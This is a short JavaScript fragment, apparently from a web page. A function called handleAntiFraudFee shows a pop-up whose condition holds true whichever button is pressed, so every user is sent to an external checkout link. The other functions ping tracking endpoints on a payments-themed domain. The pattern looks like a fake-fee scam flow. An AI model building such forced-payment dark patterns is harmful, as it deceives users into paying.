...
function handleAntiFraudFee(){
    ...
    Swal.fire({
        ...
        if (result.isConfirmed || !result.isConfirmed) {
            handleUserNextLevel();
            isLoading(1);
            window.location.href = "https://checkout.pepper.com.br/?p=135986&o=185972";
        }
    });
}
...
async function handleActiveUser(){
    return await fetch(`https://opinapagamentos.online/includes/check.php`);
}

async function handleUserNextLevel(){
    return await fetch(`https://opinapagamentos.online/includes/check2.php`);
}
